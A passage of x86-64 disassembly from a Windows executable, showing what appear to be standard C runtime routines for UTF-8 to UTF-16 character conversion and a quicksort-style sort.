   14000bdb4:	0f 95 c0             	setne  %al
   14000bdb7:	c3                   	ret
   14000bdb8:	8a c2                	mov    %dl,%al
   14000bdba:	24 e0                	and    $0xe0,%al
   14000bdbc:	3c c0                	cmp    $0xc0,%al
   14000bdbe:	75 06                	jne    0x14000bdc6
   14000bdc0:	b8 02 00 00 00       	mov    $0x2,%eax
   14000bdc5:	c3                   	ret
   14000bdc6:	8a c2                	mov    %dl,%al
   14000bdc8:	24 f0                	and    $0xf0,%al
   14000bdca:	3c e0                	cmp    $0xe0,%al
   14000bdcc:	75 06                	jne    0x14000bdd4
   14000bdce:	b8 03 00 00 00       	mov    $0x3,%eax
   14000bdd3:	c3                   	ret
   14000bdd4:	83 c8 ff             	or     $0xffffffff,%eax
   14000bdd7:	80 e2 f8             	and    $0xf8,%dl
   14000bdda:	80 fa f0             	cmp    $0xf0,%dl
   14000bddd:	8d 48 05             	lea    0x5(%rax),%ecx
   14000bde0:	0f 44 c1             	cmove  %ecx,%eax
   14000bde3:	c3                   	ret
   14000bde4:	40 53                	rex push %rbx
   14000bde6:	55                   	push   %rbp
   14000bde7:	56                   	push   %rsi
   14000bde8:	57                   	push   %rdi
   14000bde9:	41 54                	push   %r12
   14000bdeb:	41 56                	push   %r14
   14000bded:	41 57                	push   %r15
   14000bdef:	48 83 ec 40          	sub    $0x40,%rsp
   14000bdf3:	48 8b 05 06 22 01 00 	mov    0x12206(%rip),%rax        # 0x14001e000
   14000bdfa:	48 33 c4             	xor    %rsp,%rax
   14000bdfd:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000be02:	48 8b b4 24 a0 00 00 	mov    0xa0(%rsp),%rsi
   14000be09:	00 
   14000be0a:	48 8d 1d 87 38 01 00 	lea    0x13887(%rip),%rbx        # 0x14001f698
   14000be11:	45 33 e4             	xor    %r12d,%r12d
   14000be14:	48 8d 3d fa 4e 00 00 	lea    0x4efa(%rip),%rdi        # 0x140010d15
   14000be1b:	4d 85 c9             	test   %r9,%r9
   14000be1e:	48 8b c2             	mov    %rdx,%rax
   14000be21:	4c 8b fa             	mov    %rdx,%r15
   14000be24:	49 0f 45 d9          	cmovne %r9,%rbx
   14000be28:	48 85 d2             	test   %rdx,%rdx
   14000be2b:	41 8d 6c 24 01       	lea    0x1(%r12),%ebp
   14000be30:	49 0f 45 e8          	cmovne %r8,%rbp
   14000be34:	48 0f 45 fa          	cmovne %rdx,%rdi
   14000be38:	48 f7 d8             	neg    %rax
   14000be3b:	4d 1b f6             	sbb    %r14,%r14
   14000be3e:	4c 23 f1             	and    %rcx,%r14
   14000be41:	48 85 ed             	test   %rbp,%rbp
   14000be44:	75 0c                	jne    0x14000be52
   14000be46:	48 c7 c0 fe ff ff ff 	mov    $0xfffffffffffffffe,%rax
   14000be4d:	e9 33 01 00 00       	jmp    0x14000bf85
   14000be52:	66 44 39 63 06       	cmp    %r12w,0x6(%rbx)
   14000be57:	75 4f                	jne    0x14000bea8
   14000be59:	48 8b cf             	mov    %rdi,%rcx
   14000be5c:	e8 4b ff ff ff       	call   0x14000bdac
   14000be61:	4c 63 c0             	movslq %eax,%r8
   14000be64:	0f b6 07             	movzbl (%rdi),%eax
   14000be67:	48 ff c7             	inc    %rdi
   14000be6a:	41 83 f8 01          	cmp    $0x1,%r8d
   14000be6e:	76 28                	jbe    0x14000be98
   14000be70:	41 8d 48 fe          	lea    -0x2(%r8),%ecx
   14000be74:	83 f9 02             	cmp    $0x2,%ecx
   14000be77:	0f 87 fd 00 00 00    	ja     0x14000bf7a
   14000be7d:	41 0f b6 d0          	movzbl %r8b,%edx
   14000be81:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000be86:	2b ca                	sub    %edx,%ecx
   14000be88:	45 8a c8             	mov    %r8b,%r9b
   14000be8b:	ba 01 00 00 00       	mov    $0x1,%edx
   14000be90:	d3 e2                	shl    %cl,%edx
   14000be92:	ff ca                	dec    %edx
   14000be94:	23 d0                	and    %eax,%edx
   14000be96:	eb 39                	jmp    0x14000bed1
   14000be98:	4d 85 f6             	test   %r14,%r14
   14000be9b:	74 03                	je     0x14000bea0
   14000be9d:	41 89 06             	mov    %eax,(%r14)
   14000bea0:	49 8b c0             	mov    %r8,%rax
   14000bea3:	e9 dd 00 00 00       	jmp    0x14000bf85
   14000bea8:	44 8a 43 04          	mov    0x4(%rbx),%r8b
   14000beac:	8b 13                	mov    (%rbx),%edx
   14000beae:	44 8a 4b 06          	mov    0x6(%rbx),%r9b
   14000beb2:	41 8d 40 fe          	lea    -0x2(%r8),%eax
   14000beb6:	3c 02                	cmp    $0x2,%al
   14000beb8:	0f 87 bc 00 00 00    	ja     0x14000bf7a
   14000bebe:	41 80 f9 01          	cmp    $0x1,%r9b
   14000bec2:	0f 82 b2 00 00 00    	jb     0x14000bf7a
   14000bec8:	45 3a c8             	cmp    %r8b,%r9b
   14000becb:	0f 83 a9 00 00 00    	jae    0x14000bf7a
   14000bed1:	45 0f b6 d9          	movzbl %r9b,%r11d
   14000bed5:	4c 3b dd             	cmp    %rbp,%r11
   14000bed8:	45 8b d3             	mov    %r11d,%r10d
   14000bedb:	4c 0f 43 d5          	cmovae %rbp,%r10
   14000bedf:	eb 1e                	jmp    0x14000beff
   14000bee1:	0f b6 0f             	movzbl (%rdi),%ecx
   14000bee4:	48 ff c7             	inc    %rdi
   14000bee7:	8a c1                	mov    %cl,%al
   14000bee9:	24 c0                	and    $0xc0,%al
   14000beeb:	3c 80                	cmp    $0x80,%al
   14000beed:	0f 85 87 00 00 00    	jne    0x14000bf7a
   14000bef3:	8b c2                	mov    %edx,%eax
   14000bef5:	83 e1 3f             	and    $0x3f,%ecx
   14000bef8:	c1 e0 06             	shl    $0x6,%eax
   14000befb:	8b d1                	mov    %ecx,%edx
   14000befd:	0b d0                	or     %eax,%edx
   14000beff:	48 8b c7             	mov    %rdi,%rax
   14000bf02:	49 2b c7             	sub    %r15,%rax
   14000bf05:	49 3b c2             	cmp    %r10,%rax
   14000bf08:	72 d7                	jb     0x14000bee1
   14000bf0a:	4d 3b d3             	cmp    %r11,%r10
   14000bf0d:	73 1a                	jae    0x14000bf29
   14000bf0f:	41 0f b6 c0          	movzbl %r8b,%eax
   14000bf13:	45 2a ca             	sub    %r10b,%r9b
   14000bf16:	66 89 43 04          	mov    %ax,0x4(%rbx)
   14000bf1a:	41 0f b6 c1          	movzbl %r9b,%eax
   14000bf1e:	66 89 43 06          	mov    %ax,0x6(%rbx)
   14000bf22:	89 13                	mov    %edx,(%rbx)
   14000bf24:	e9 1d ff ff ff       	jmp    0x14000be46
   14000bf29:	8d 82 00 28 ff ff    	lea    -0xd800(%rdx),%eax
   14000bf2f:	3d ff 07 00 00       	cmp    $0x7ff,%eax
   14000bf34:	76 44                	jbe    0x14000bf7a
   14000bf36:	81 fa 00 00 11 00    	cmp    $0x110000,%edx
   14000bf3c:	73 3c                	jae    0x14000bf7a
   14000bf3e:	41 0f b6 c0          	movzbl %r8b,%eax
   14000bf42:	c7 44 24 20 80 00 00 	movl   $0x80,0x20(%rsp)
   14000bf49:	00 
   14000bf4a:	c7 44 24 24 00 08 00 	movl   $0x800,0x24(%rsp)
   14000bf51:	00 
   14000bf52:	c7 44 24 28 00 00 01 	movl   $0x10000,0x28(%rsp)
   14000bf59:	00 
   14000bf5a:	3b 54 84 18          	cmp    0x18(%rsp,%rax,4),%edx
   14000bf5e:	72 1a                	jb     0x14000bf7a
   14000bf60:	4d 85 f6             	test   %r14,%r14
   14000bf63:	74 03                	je     0x14000bf68
   14000bf65:	41 89 16             	mov    %edx,(%r14)
   14000bf68:	f7 da                	neg    %edx
   14000bf6a:	48 8b d3             	mov    %rbx,%rdx
   14000bf6d:	48 1b c9             	sbb    %rcx,%rcx
   14000bf70:	49 23 cb             	and    %r11,%rcx
   14000bf73:	e8 d8 20 00 00       	call   0x14000e050
   14000bf78:	eb 0b                	jmp    0x14000bf85
   14000bf7a:	48 8b d6             	mov    %rsi,%rdx
   14000bf7d:	48 8b cb             	mov    %rbx,%rcx
   14000bf80:	e8 d3 20 00 00       	call   0x14000e058
   14000bf85:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000bf8a:	48 33 cc             	xor    %rsp,%rcx
   14000bf8d:	e8 7e 71 ff ff       	call   0x140003110
   14000bf92:	48 83 c4 40          	add    $0x40,%rsp
   14000bf96:	41 5f                	pop    %r15
   14000bf98:	41 5e                	pop    %r14
   14000bf9a:	41 5c                	pop    %r12
   14000bf9c:	5f                   	pop    %rdi
   14000bf9d:	5e                   	pop    %rsi
   14000bf9e:	5d                   	pop    %rbp
   14000bf9f:	5b                   	pop    %rbx
   14000bfa0:	c3                   	ret
   14000bfa1:	cc                   	int3
   14000bfa2:	cc                   	int3
   14000bfa3:	cc                   	int3
   14000bfa4:	40 53                	rex push %rbx
   14000bfa6:	48 83 ec 40          	sub    $0x40,%rsp
   14000bfaa:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000bfaf:	48 8b d9             	mov    %rcx,%rbx
   14000bfb2:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   14000bfb7:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000bfbc:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000bfc1:	e8 1e fe ff ff       	call   0x14000bde4
   14000bfc6:	48 83 f8 04          	cmp    $0x4,%rax
   14000bfca:	77 19                	ja     0x14000bfe5
   14000bfcc:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   14000bfd0:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
   14000bfd6:	76 05                	jbe    0x14000bfdd
   14000bfd8:	b9 fd ff 00 00       	mov    $0xfffd,%ecx
   14000bfdd:	48 85 db             	test   %rbx,%rbx
   14000bfe0:	74 03                	je     0x14000bfe5
   14000bfe2:	66 89 0b             	mov    %cx,(%rbx)
   14000bfe5:	48 83 c4 40          	add    $0x40,%rsp
   14000bfe9:	5b                   	pop    %rbx
   14000bfea:	c3                   	ret
   14000bfeb:	cc                   	int3
   14000bfec:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000bff1:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000bff6:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000bffb:	57                   	push   %rdi
   14000bffc:	41 54                	push   %r12
   14000bffe:	41 55                	push   %r13
   14000c000:	41 56                	push   %r14
   14000c002:	41 57                	push   %r15
   14000c004:	48 83 ec 30          	sub    $0x30,%rsp
   14000c008:	48 8b 3a             	mov    (%rdx),%rdi
   14000c00b:	45 33 ed             	xor    %r13d,%r13d
   14000c00e:	4d 8b e1             	mov    %r9,%r12
   14000c011:	49 8b f0             	mov    %r8,%rsi
   14000c014:	4c 8b f2             	mov    %rdx,%r14
   14000c017:	48 8b e9             	mov    %rcx,%rbp
   14000c01a:	48 85 c9             	test   %rcx,%rcx
   14000c01d:	0f 84 eb 00 00 00    	je     0x14000c10e
   14000c023:	48 8b d9             	mov    %rcx,%rbx
   14000c026:	4d 85 c0             	test   %r8,%r8
   14000c029:	0f 84 b3 00 00 00    	je     0x14000c0e2
   14000c02f:	4c 8b bc 24 80 00 00 	mov    0x80(%rsp),%r15
   14000c036:	00 
   14000c037:	44 38 2f             	cmp    %r13b,(%rdi)
   14000c03a:	75 08                	jne    0x14000c044
   14000c03c:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000c042:	eb 1d                	jmp    0x14000c061
   14000c044:	44 38 6f 01          	cmp    %r13b,0x1(%rdi)
   14000c048:	75 08                	jne    0x14000c052
   14000c04a:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000c050:	eb 0f                	jmp    0x14000c061
   14000c052:	8a 47 02             	mov    0x2(%rdi),%al
   14000c055:	f6 d8                	neg    %al
   14000c057:	4d 1b c0             	sbb    %r8,%r8
   14000c05a:	49 f7 d8             	neg    %r8
   14000c05d:	49 83 c0 03          	add    $0x3,%r8
   14000c061:	4d 8b cc             	mov    %r12,%r9
   14000c064:	44 89 6c 24 60       	mov    %r13d,0x60(%rsp)
   14000c069:	48 8b d7             	mov    %rdi,%rdx
   14000c06c:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   14000c071:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000c076:	e8 69 fd ff ff       	call   0x14000bde4
   14000c07b:	48 8b d0             	mov    %rax,%rdx
   14000c07e:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000c082:	74 78                	je     0x14000c0fc
   14000c084:	48 85 c0             	test   %rax,%rax
   14000c087:	74 6a                	je     0x14000c0f3
   14000c089:	8b 4c 24 60          	mov    0x60(%rsp),%ecx
   14000c08d:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
   14000c093:	76 39                	jbe    0x14000c0ce
   14000c095:	48 83 fe 01          	cmp    $0x1,%rsi
   14000c099:	76 47                	jbe    0x14000c0e2
   14000c09b:	81 c1 00 00 ff ff    	add    $0xffff0000,%ecx
   14000c0a1:	41 b8 00 d8 00 00    	mov    $0xd800,%r8d
   14000c0a7:	8b c1                	mov    %ecx,%eax
   14000c0a9:	89 4c 24 60          	mov    %ecx,0x60(%rsp)
   14000c0ad:	c1 e8 0a             	shr    $0xa,%eax
   14000c0b0:	48 ff ce             	dec    %rsi
   14000c0b3:	66 41 0b c0          	or     %r8w,%ax
   14000c0b7:	66 89 03             	mov    %ax,(%rbx)
   14000c0ba:	b8 ff 03 00 00       	mov    $0x3ff,%eax
   14000c0bf:	66 23 c8             	and    %ax,%cx
   14000c0c2:	48 83 c3 02          	add    $0x2,%rbx
   14000c0c6:	b8 00 dc 00 00       	mov    $0xdc00,%eax
   14000c0cb:	66 0b c8             	or     %ax,%cx
   14000c0ce:	66 89 0b             	mov    %cx,(%rbx)
   14000c0d1:	48 03 fa             	add    %rdx,%rdi
   14000c0d4:	48 83 c3 02          	add    $0x2,%rbx
   14000c0d8:	48 83 ee 01          	sub    $0x1,%rsi
   14000c0dc:	0f 85 55 ff ff ff    	jne    0x14000c037
   14000c0e2:	48 2b dd             	sub    %rbp,%rbx
   14000c0e5:	49 89 3e             	mov    %rdi,(%r14)
   14000c0e8:	48 d1 fb             	sar    $1,%rbx
   14000c0eb:	48 8b c3             	mov    %rbx,%rax
   14000c0ee:	e9 91 00 00 00       	jmp    0x14000c184
   14000c0f3:	49 8b fd             	mov    %r13,%rdi
   14000c0f6:	66 44 89 2b          	mov    %r13w,(%rbx)
   14000c0fa:	eb e6                	jmp    0x14000c0e2
   14000c0fc:	49 89 3e             	mov    %rdi,(%r14)
   14000c0ff:	41 c6 47 30 01       	movb   $0x1,0x30(%r15)
   14000c104:	41 c7 47 2c 2a 00 00 	movl   $0x2a,0x2c(%r15)
   14000c10b:	00 
   14000c10c:	eb 72                	jmp    0x14000c180
   14000c10e:	48 8b b4 24 80 00 00 	mov    0x80(%rsp),%rsi
   14000c115:	00 
   14000c116:	49 8b dd             	mov    %r13,%rbx
   14000c119:	44 38 2f             	cmp    %r13b,(%rdi)
   14000c11c:	75 08                	jne    0x14000c126
   14000c11e:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000c124:	eb 1d                	jmp    0x14000c143
   14000c126:	44 38 6f 01          	cmp    %r13b,0x1(%rdi)
   14000c12a:	75 08                	jne    0x14000c134
   14000c12c:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000c132:	eb 0f                	jmp    0x14000c143
   14000c134:	8a 47 02             	mov    0x2(%rdi),%al
   14000c137:	f6 d8                	neg    %al
   14000c139:	4d 1b c0             	sbb    %r8,%r8
   14000c13c:	49 f7 d8             	neg    %r8
   14000c13f:	49 83 c0 03          	add    $0x3,%r8
   14000c143:	4d 8b cc             	mov    %r12,%r9
   14000c146:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000c14b:	48 8b d7             	mov    %rdi,%rdx
   14000c14e:	33 c9                	xor    %ecx,%ecx
   14000c150:	e8 8f fc ff ff       	call   0x14000bde4
   14000c155:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000c159:	74 1a                	je     0x14000c175
   14000c15b:	48 85 c0             	test   %rax,%rax
   14000c15e:	74 8b                	je     0x14000c0eb
   14000c160:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   14000c164:	48 03 f8             	add    %rax,%rdi
   14000c167:	48 83 f8 04          	cmp    $0x4,%rax
   14000c16b:	48 0f 45 cb          	cmovne %rbx,%rcx
   14000c16f:	48 8d 59 01          	lea    0x1(%rcx),%rbx
   14000c173:	eb a4                	jmp    0x14000c119
   14000c175:	c6 46 30 01          	movb   $0x1,0x30(%rsi)
   14000c179:	c7 46 2c 2a 00 00 00 	movl   $0x2a,0x2c(%rsi)
   14000c180:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000c184:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   14000c189:	48 8b 6c 24 70       	mov    0x70(%rsp),%rbp
   14000c18e:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   14000c193:	48 83 c4 30          	add    $0x30,%rsp
   14000c197:	41 5f                	pop    %r15
   14000c199:	41 5e                	pop    %r14
   14000c19b:	41 5d                	pop    %r13
   14000c19d:	41 5c                	pop    %r12
   14000c19f:	5f                   	pop    %rdi
   14000c1a0:	c3                   	ret
   14000c1a1:	cc                   	int3
   14000c1a2:	cc                   	int3
   14000c1a3:	cc                   	int3
   14000c1a4:	48 83 ec 28          	sub    $0x28,%rsp
   14000c1a8:	48 85 c9             	test   %rcx,%rcx
   14000c1ab:	75 15                	jne    0x14000c1c2
   14000c1ad:	e8 ba bd ff ff       	call   0x140007f6c
   14000c1b2:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000c1b8:	e8 07 bc ff ff       	call   0x140007dc4
   14000c1bd:	83 c8 ff             	or     $0xffffffff,%eax
   14000c1c0:	eb 04                	jmp    0x14000c1c6
   14000c1c2:	8b 41 18             	mov    0x18(%rcx),%eax
   14000c1c5:	90                   	nop
   14000c1c6:	48 83 c4 28          	add    $0x28,%rsp
   14000c1ca:	c3                   	ret
   14000c1cb:	cc                   	int3
   14000c1cc:	cc                   	int3
   14000c1cd:	cc                   	int3
   14000c1ce:	cc                   	int3
   14000c1cf:	cc                   	int3
   14000c1d0:	41 54                	push   %r12
   14000c1d2:	41 55                	push   %r13
   14000c1d4:	41 56                	push   %r14
   14000c1d6:	41 57                	push   %r15
   14000c1d8:	48 81 ec 48 04 00 00 	sub    $0x448,%rsp
   14000c1df:	48 8b 05 1a 1e 01 00 	mov    0x11e1a(%rip),%rax        # 0x14001e000
   14000c1e6:	48 33 c4             	xor    %rsp,%rax
   14000c1e9:	48 89 84 24 10 04 00 	mov    %rax,0x410(%rsp)
   14000c1f0:	00 
   14000c1f1:	4d 8b e1             	mov    %r9,%r12
   14000c1f4:	4d 8b f0             	mov    %r8,%r14
   14000c1f7:	4c 8b fa             	mov    %rdx,%r15
   14000c1fa:	4c 8b e9             	mov    %rcx,%r13
   14000c1fd:	48 85 c9             	test   %rcx,%rcx
   14000c200:	75 1a                	jne    0x14000c21c
   14000c202:	48 85 d2             	test   %rdx,%rdx
   14000c205:	74 15                	je     0x14000c21c
   14000c207:	e8 60 bd ff ff       	call   0x140007f6c
   14000c20c:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000c212:	e8 ad bb ff ff       	call   0x140007dc4
   14000c217:	e9 2c 03 00 00       	jmp    0x14000c548
   14000c21c:	4d 85 f6             	test   %r14,%r14
   14000c21f:	74 e6                	je     0x14000c207
   14000c221:	4d 85 e4             	test   %r12,%r12
   14000c224:	74 e1                	je     0x14000c207
   14000c226:	49 8b cc             	mov    %r12,%rcx
   14000c229:	e8 3e 1e 00 00       	call   0x14000e06c
   14000c22e:	33 d2                	xor    %edx,%edx
   14000c230:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000c235:	41 b8 f0 01 00 00    	mov    $0x1f0,%r8d
   14000c23b:	e8 c0 2e 00 00       	call   0x14000f100
   14000c240:	33 d2                	xor    %edx,%edx
   14000c242:	48 8d 8c 24 20 02 00 	lea    0x220(%rsp),%rcx
   14000c249:	00 
   14000c24a:	41 b8 f0 01 00 00    	mov    $0x1f0,%r8d
   14000c250:	e8 ab 2e 00 00       	call   0x14000f100
   14000c255:	49 83 ff 02          	cmp    $0x2,%r15
   14000c259:	0f 82 e9 02 00 00    	jb     0x14000c548
   14000c25f:	49 ff cf             	dec    %r15
   14000c262:	48 89 9c 24 40 04 00 	mov    %rbx,0x440(%rsp)
   14000c269:	00 
   14000c26a:	4d 0f af fe          	imul   %r14,%r15
   14000c26e:	48 89 ac 24 38 04 00 	mov    %rbp,0x438(%rsp)
   14000c275:	00 
   14000c276:	4d 03 fd             	add    %r13,%r15
   14000c279:	48 89 b4 24 30 04 00 	mov    %rsi,0x430(%rsp)
   14000c280:	00 
   14000c281:	33 c9                	xor    %ecx,%ecx
   14000c283:	48 89 bc 24 28 04 00 	mov    %rdi,0x428(%rsp)
   14000c28a:	00 
   14000c28b:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000c290:	33 d2                	xor    %edx,%edx
   14000c292:	49 8b c7             	mov    %r15,%rax
   14000c295:	49 2b c5             	sub    %r13,%rax
   14000c298:	49 f7 f6             	div    %r14
   14000c29b:	48 8d 58 01          	lea    0x1(%rax),%rbx
   14000c29f:	48 83 fb 08          	cmp    $0x8,%rbx
   14000c2a3:	0f 87 8b 00 00 00    	ja     0x14000c334
   14000c2a9:	4d 3b fd             	cmp    %r13,%r15
   14000c2ac:	76 65                	jbe    0x14000c313
   14000c2ae:	4b 8d 34 2e          	lea    (%r14,%r13,1),%rsi
   14000c2b2:	49 8b dd             	mov    %r13,%rbx
   14000c2b5:	48 8b fe             	mov    %rsi,%rdi
   14000c2b8:	49 3b f7             	cmp    %r15,%rsi
   14000c2bb:	77 20                	ja     0x14000c2dd
   14000c2bd:	0f 1f 00             	nopl   (%rax)
   14000c2c0:	48 8b d3             	mov    %rbx,%rdx
   14000c2c3:	48 8b cf             	mov    %rdi,%rcx
   14000c2c6:	41 ff d4             	call   *%r12
   14000c2c9:	85 c0                	test   %eax,%eax
   14000c2cb:	48 8b cf             	mov    %rdi,%rcx
   14000c2ce:	48 0f 4e cb          	cmovle %rbx,%rcx
   14000c2d2:	49 03 fe             	add    %r14,%rdi
   14000c2d5:	48 8b d9             	mov    %rcx,%rbx
   14000c2d8:	49 3b ff             	cmp    %r15,%rdi
   14000c2db:	76 e3                	jbe    0x14000c2c0
   14000c2dd:	4d 8b c6             	mov    %r14,%r8
   14000c2e0:	49 8b d7             	mov    %r15,%rdx
   14000c2e3:	49 3b df             	cmp    %r15,%rbx
   14000c2e6:	74 1e                	je     0x14000c306
   14000c2e8:	49 2b df             	sub    %r15,%rbx
   14000c2eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000c2f0:	0f b6 02             	movzbl (%rdx),%eax
   14000c2f3:	0f b6 0c 13          	movzbl (%rbx,%rdx,1),%ecx
   14000c2f7:	88 04 13             	mov    %al,(%rbx,%rdx,1)
   14000c2fa:	88 0a                	mov    %cl,(%rdx)
   14000c2fc:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   14000c300:	49 83 e8 01          	sub    $0x1,%r8
   14000c304:	75 ea                	jne    0x14000c2f0
   14000c306:	4d 2b fe             	sub    %r14,%r15
   14000c309:	4d 3b fd             	cmp    %r13,%r15
   14000c30c:	77 a4                	ja     0x14000c2b2
   14000c30e:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000c313:	48 83 e9 01          	sub    $0x1,%rcx
   14000c317:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000c31c:	0f 88 06 02 00 00    	js     0x14000c528
   14000c322:	4c 8b 6c cc 30       	mov    0x30(%rsp,%rcx,8),%r13
   14000c327:	4c 8b bc cc 20 02 00 	mov    0x220(%rsp,%rcx,8),%r15
   14000c32e:	00 
   14000c32f:	e9 5c ff ff ff       	jmp    0x14000c290
   14000c334:	48 d1 eb             	shr    $1,%rbx
   14000c337:	49 8b cd             	mov    %r13,%rcx
   14000c33a:	49 0f af de          	imul   %r14,%rbx
   14000c33e:	4a 8d 3c 2b          	lea    (%rbx,%r13,1),%rdi
   14000c342:	48 8b d7             	mov    %rdi,%rdx
   14000c345:	41 ff d4             	call   *%r12
   14000c348:	85 c0                	test   %eax,%eax
   14000c34a:	7e 2f                	jle    0x14000c37b
   14000c34c:	4d 8b ce             	mov    %r14,%r9
   14000c34f:	4c 8b c7             	mov    %rdi,%r8
   14000c352:	4c 3b ef             	cmp    %rdi,%r13
   14000c355:	74 24                	je     0x14000c37b
   14000c357:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000c35e:	00 00 
   14000c360:	41 0f b6 00          	movzbl (%r8),%eax
   14000c364:	49 8b d0             	mov    %r8,%rdx
   14000c367:	48 2b d3             	sub    %rbx,%rdx
   14000c36a:	0f b6 0a             	movzbl (%rdx),%ecx
   14000c36d:	88 02                	mov    %al,(%rdx)
   14000c36f:	41 88 08             	mov    %cl,(%r8)
   14000c372:	49 ff c0             	inc    %r8
   14000c375:	49 83 e9 01          	sub    $0x1,%r9
   14000c379:	75 e5                	jne    0x14000c360
   14000c37b:	49 8b d7             	mov    %r15,%rdx
   14000c37e:	49 8b cd             	mov    %r13,%rcx
   14000c381:	41 ff d4             	call   *%r12
   14000c384:	85 c0                	test   %eax,%eax
   14000c386:	7e 30                	jle    0x14000c3b8
   14000c388:	4d 8b c6             	mov    %r14,%r8
   14000c38b:	49 8b d7             	mov    %r15,%rdx
   14000c38e:	4d 3b ef             	cmp    %r15,%r13
   14000c391:	74 25                	je     0x14000c3b8
   14000c393:	4d 8b cd             	mov    %r13,%r9
   14000c396:	4d 2b cf             	sub    %r15,%r9
   14000c399:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   14000c3a0:	0f b6 02             	movzbl (%rdx),%eax
   14000c3a3:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   14000c3a8:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   14000c3ac:	88 0a                	mov    %cl,(%rdx)
   14000c3ae:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   14000c3b2:	49 83 e8 01          	sub    $0x1,%r8
   14000c3b6:	75 e8                	jne    0x14000c3a0
   14000c3b8:	49 8b d7             	mov    %r15,%rdx
   14000c3bb:	48 8b cf             	mov    %rdi,%rcx
   14000c3be:	41 ff d4             	call   *%r12
   14000c3c1:	85 c0                	test   %eax,%eax
   14000c3c3:	7e 33                	jle    0x14000c3f8
   14000c3c5:	4d 8b c6             	mov    %r14,%r8
   14000c3c8:	49 8b d7             	mov    %r15,%rdx
   14000c3cb:	49 3b ff             	cmp    %r15,%rdi
   14000c3ce:	74 28                	je     0x14000c3f8
   14000c3d0:	4c 8b cf             	mov    %rdi,%r9
   14000c3d3:	4d 2b cf             	sub    %r15,%r9
   14000c3d6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000c3dd:	00 00 00 
   14000c3e0:	0f b6 02             	movzbl (%rdx),%eax
   14000c3e3:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   14000c3e8:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   14000c3ec:	88 0a                	mov    %cl,(%rdx)
   14000c3ee:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   14000c3f2:	49 83 e8 01          	sub    $0x1,%r8
   14000c3f6:	75 e8                	jne    0x14000c3e0
   14000c3f8:	49 8b dd             	mov    %r13,%rbx
   14000c3fb:	49 8b f7             	mov    %r15,%rsi
   14000c3fe:	66 90                	xchg   %ax,%ax
   14000c400:	48 3b fb             	cmp    %rbx,%rdi
   14000c403:	76 1b                	jbe    0x14000c420
   14000c405:	49 03 de             	add    %r14,%rbx
   14000c408:	48 3b df             	cmp    %rdi,%rbx
   14000c40b:	73 13                	jae    0x14000c420
   14000c40d:	48 8b d7             	mov    %rdi,%rdx
   14000c410:	48 8b cb             	mov    %rbx,%rcx
   14000c413:	41 ff d4             	call   *%r12
   14000c416:	85 c0                	test   %eax,%eax
   14000c418:	7e eb                	jle    0x14000c405
   14000c41a:	eb 19                	jmp    0x14000c435
   14000c41c:	0f 1f 40 00          	nopl   0x0(%rax)
   14000c420:	49 03 de             	add    %r14,%rbx
   14000c423:	49 3b df             	cmp    %r15,%rbx
   14000c426:	77 0d                	ja     0x14000c435
   14000c428:	48 8b d7             	mov    %rdi,%rdx
   14000c42b:	48 8b cb             	mov    %rbx,%rcx
   14000c42e:	41 ff d4             	call   *%r12
   14000c431:	85 c0                	test   %eax,%eax
   14000c433:	7e eb                	jle    0x14000c420
   14000c435:	48 8b ee             	mov    %rsi,%rbp
   14000c438:	49 2b f6             	sub    %r14,%rsi
   14000c43b:	48 3b f7             	cmp    %rdi,%rsi
   14000c43e:	76 0d                	jbe    0x14000c44d
   14000c440:	48 8b d7             	mov    %rdi,%rdx
   14000c443:	48 8b ce             	mov    %rsi,%rcx
   14000c446:	41 ff d4             	call   *%r12
   14000c449:	85 c0                	test   %eax,%eax
   14000c44b:	7f e8                	jg     0x14000c435
   14000c44d:	48 3b f3             	cmp    %rbx,%rsi
   14000c450:	72 38                	jb     0x14000c48a
   14000c452:	4d 8b c6             	mov    %r14,%r8
   14000c455:	48 8b d6             	mov    %rsi,%rdx
   14000c458:	74 1e                	je     0x14000c478
   14000c45a:	4c 8b cb             	mov    %rbx,%r9
   14000c45d:	4c 2b ce             	sub    %rsi,%r9
   14000c460:	0f b6 02             	movzbl (%rdx),%eax
